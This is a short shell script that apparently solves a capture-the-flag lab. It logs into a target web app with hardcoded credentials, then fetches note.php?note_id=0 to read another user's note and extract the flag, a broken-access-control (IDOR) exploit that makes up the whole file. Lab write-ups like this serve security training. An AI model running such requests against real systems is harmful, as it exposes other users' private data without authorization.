#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.210.85"
attack_ip="10.10.30.237"

# Prepare environment
mkdir /work/

# Initiate session
echo "1 - INITIATING SESSION"
curl -s -X GET "http://$target_ip" -c "/work/cookie-bac.txt" -L > /dev/null
PHPSESSID=$(grep PHPSESSID "/work/cookie-bac.txt" | awk '{print $7}')

if [ -z "$PHPSESSID" ]; then
    echo "No PHPSESSID received."
    rm -f /work/cookie-bac.txt
    exit 1
fi

echo "--> Session initiated : $PHPSESSID"

# Authenticate
echo "2 - AUTHENTICATING"
echo "Authenticating and capturing PHPSESSID..."
curl -s -X POST "http://$target_ip" -b /work/cookie-bac.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "user=noot" -d"pass=test1234" > /dev/null


# Use the PHPSESSID for the next HTTP request
echo "3 - FETCHING PROTECTED RESOURCE"
curl -s -X GET "http://$target_ip/note.php?note_id=0" -b /work/cookie-bac.txt -H "Content-Type: application/json" -o /work/bac-flag.html -L
echo "--> Flag is : $(sed -n 's/.*<pre>\(.*{.*}\)<\/pre>.*/\1/p' /work/bac-flag.html)"

# Clean up
rm -f /work/cookie-bac.txt